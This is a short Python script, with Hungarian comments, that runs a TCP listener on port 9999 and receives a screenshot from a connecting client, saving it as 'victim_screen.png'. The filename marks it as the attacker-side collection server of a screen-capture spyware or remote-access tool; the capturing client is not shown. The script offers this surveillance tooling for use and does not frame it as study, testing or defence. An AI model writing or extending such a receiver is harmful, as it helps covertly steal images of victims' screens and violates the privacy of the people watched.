import socket

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 9999))
    server.listen(1)
    print("[*] Várakozás a képre a 9999-es porton...")

    client, addr = server.accept()
    print(f"[+] Kapcsolat: {addr}")

    # 1. Lépés: Méret fogadása
    file_size = client.recv(1024).decode()
    print(f"[*] Bejövő fájl mérete: {file_size} bájt")
    client.send(b"ACK") # Nyugtázzuk

    # 2. Lépés: Adat fogadása
    received_bytes = 0
    with open("victim_screen.png", "wb") as f:
        while received_bytes < int(file_size):
            chunk = client.recv(4096)
            if not chunk: break
            f.write(chunk)
            received_bytes += len(chunk)

    print("[+] Kép sikeresen letöltve: victim_screen.png")
    client.close()
    server.close()

if __name__ == "__main__":
    start_server()